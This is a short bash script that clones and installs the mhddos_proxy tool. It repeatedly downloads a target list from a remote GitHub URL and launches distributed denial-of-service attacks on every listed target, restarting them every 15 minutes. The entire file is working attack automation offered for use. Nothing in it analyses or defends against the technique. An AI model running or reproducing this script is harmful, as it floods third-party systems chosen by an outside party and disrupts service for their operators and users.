#!/bin/bash
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt

threads="${1:-1000}"; threads="-t $threads"
rpc="--rpc 1000"
proxy_upd="-p 3600"
debug="--debug"

# Restart attacks and update targets every 15 minutes
while true
do
   pkill -f start.py; pkill -f runner.py 
   # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.
   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
   echo -e "\nNumber of targets in list: " $list_size "\n"
   while [[ $list_size = "0"  ]]
      do
            sleep 5
            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
            echo -e "\nNumber of targets in list: " $list_size "\n"
      done
   for (( i=1; i<=list_size; i++ ))
      do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
            echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
      done
sleep 15m
done
